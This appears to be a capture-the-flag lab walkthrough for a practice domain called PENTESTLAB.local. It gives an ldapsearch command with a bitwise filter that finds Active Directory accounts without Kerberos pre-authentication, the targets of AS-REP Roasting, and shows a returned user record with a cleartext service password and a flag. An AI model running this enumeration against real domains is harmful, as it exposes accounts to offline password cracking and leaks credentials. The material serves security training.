
### Our mission is: Target vulnerable AS-REP Roasting accounts and isolate hidden account attributes via Advanced LDAP Bitwise Filtering

Blueprint:
`ldapsearch [1. Authentication Type] [2. Target Connection] [3. Bind Credentials] [4. Search Anchor] [5. Bitwise OID Filter] [6. Attribute Selection]`

Command:

```bash
ldapsearch -x -H ldap://192.168.56.20 -D "CN=student,CN=Users,DC=PENTESTLAB,DC=local" -w 'password1234' -b "DC=PENTESTLAB,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "*" 

```

Explanation:

`-x`: Specifies simple authentication mechanism instead of SASL, enabling direct credential-based binds.

`-H ldap://192.168.56.20`: Identifies the target Domain Controller URI using the unencrypted LDAP protocol over standard port 389.

`-D "CN=student,CN=Users,DC=PENTESTLAB,DC=local"`: Declares the Bind Distinguished Name (DN) representing the authenticating security principal (`student`) used to query the directory service.

`-w 'password1234'`: Supplies the cleartext password string associated with the Bind DN to complete the authentication handshake.

`-b "DC=PENTESTLAB,DC=local"`: Establishes the Base Search DN mapping the topmost container root to mandate a comprehensive, top-down tree traversal.

`"(userAccountControl:1.2.840.113556.1.4.803:=4194304)"`: Implements an advanced LDAP search filter leveraging the `LDAP_MATCHING_RULE_BIT_AND` Extensible Match rule Object Identifier (OID). This programmatically evaluates the `userAccountControl` (UAC) bitmask attribute to isolate domain objects where the `DONT_REQ_PREAUTH` flag (decimal value `4194304` / hex `0x400000`) is explicitly set.

`"*"`: A directory wild-card selector directing the domain controller to explicitly return all standard object attributes associated with matching records, ensuring extended fields are completely visible.

Brief Explanation:

> "Establish an authenticated LDAP session to the Domain Controller at 192.168.56.20 using legitimate domain student credentials. Rather than performing a broad directory dump, execute an engineered search leveraging the Active Directory bitwise matching OID `1.2.840.113556.1.4.803`. This parses the `userAccountControl` bitmask matrix globally across the domain topology, isolating accounts that explicitly hold the `DONT_REQ_PREAUTH` parameter. Pinpointing these accounts exposes critical AS-REP Roasting vectors, enabling an unauthenticated adversary to request Kerberos TGTs directly from the KDC and perform offline cryptographic brute-forcing. The wildcard selector forces the directory to return all populated fields, revealing flags leaked within custom organizational attributes."

Interaction Workflow & Retrieval:

```text
# Ryan Foster, Users, LDAP-Project, PENTESTLAB.local
dn: CN=Ryan Foster,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Foster
distinguishedName: CN=Ryan Foster,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
instanceType: 4
whenCreated: 20260423115205.0Z
whenChanged: 20260617141330.0Z
uSNCreated: 290945
info: svc credential: User@2024!
memberOf: CN=LDAP-Lab-Users,OU=Groups,OU=LDAP-Project,DC=PENTESTLAB,DC=local
uSNChanged: 372846
employeeNumber: FLAG4{4S_R3P_R04ST1NG_M4ST3R_F5}
name: Ryan Foster
objectGUID:: iofflomEMkiUhn20XFV2+w==
userAccountControl: 4260352
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 134219403235205054
lastLogoff: 0
lastLogon: 134265301627357236
pwdLastSet: 134214187253845472
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAL37AEBX3FkP6RvrGfwQAAA==
accountExpires: 9223372036854775807
logonCount: 15
sAMAccountName: rfoster
sAMAccountType: 805306368
userPrincipalName: rfoster@pentestlab.local
servicePrincipalName: MSSQLSvc/app-dev.pentestlab.local:1433
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PENTESTLAB,DC=local
dSCorePropagationData: 20260423155106.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 134261792109203286

```
